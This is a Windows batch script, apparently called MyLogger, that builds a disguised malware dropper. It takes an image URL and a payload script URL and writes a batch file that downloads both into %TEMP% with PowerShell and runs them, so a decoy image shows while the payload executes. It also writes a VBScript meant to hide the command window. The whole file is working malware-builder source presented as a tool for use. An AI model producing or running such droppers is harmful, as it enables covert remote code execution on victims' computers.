@echo off
setlocal enabledelayedexpansion
title MyLogger - xcorr
rem MyLogger by xcorr.
rem github: https://github.com/xcorrr
:main
cls
echo MyLogger - image logger creator. by xcorr.  
echo Github: https://github.com/xcorrr
echo NOTE: Will require an image URL and a script URL (the payload).
echo.
set /p "MainInput=>>> "
if "%MainInput%" == ".info" (
    call :info
    goto main
)
if "%MainInput%" == ".help" (
    goto help
)
if "%MainInput%" == ".exit" (
    cls
    exit /b
)
if "%MainInput%" == ".new" (
    call :info
    echo.
    set /p "imgurl=Enter image URL: "
    set /p "scripturl=Enter script URL: "
    set /p "imgofilename=Enter output image filename (including extension): "
    set /p "scriptofilename=Enter output script filename (including extension): "
    set /p "ofilename=Enter Output filename (no extension): "
    call :dot
    goto main
)
echo Unknown command: %MainInput%
pause
goto main

:info
echo MyLogger by xcorr.
echo Github: https://github.com/xcorrr
echo Version 1.2.0
pause
goto :eof

:help
echo.
echo Available Commands:
echo   .info  - Show information about MyLogger
echo   .new   - Create a new logger script
echo   .exit  - Exit the program
echo   .help  - Show this help message
pause
goto main

:dot
set dots=
for /l %%i in (1,1,3) do (
    set dots=!dots!.
    echo Generating!dots!
    timeout /nobreak /t 1 >nul
)
call :WriteFiles
echo.
echo Writing Files Completed.
timeout /nobreak /t 2 >nul
cls
goto :eof

:WriteFiles
set newline=echo.>>"%ofilename%.bat"
set new=echo.>>"%ofilename%.vbs"
echo @echo off >> "%ofilename%.bat"
%newline%
echo cd %%TEMP%% >> "%ofilename%.bat"
%newline%
echo Powershell -Command "Invoke-WebRequest '%imgurl%' -OutFile '%imgofilename%'" >> "%ofilename%.bat"
%newline%
echo "%imgofilename%" >> "%ofilename%.bat"
%newline%
echo Powershell -Command "Invoke-WebRequest '%scripturl%' -OutFile '%scriptofilename%'" >> "%ofilename%.bat"
%newline%
echo "%scriptofilename%" >> "%ofilename%.bat"

rem VBScript that hides cmd window.
echo function hide() >> "%ofilename%.vbs"
%new%
echo Set Sh = CreateObject("WScript.Shell") >> "%ofilename%.vbs"
%new%
echo Sh.Run "%ofilename%.bat", 7, False >> "%ofilename%.vbs"
%new%
echo End Function >> "%ofilename%.vbs"
goto :eof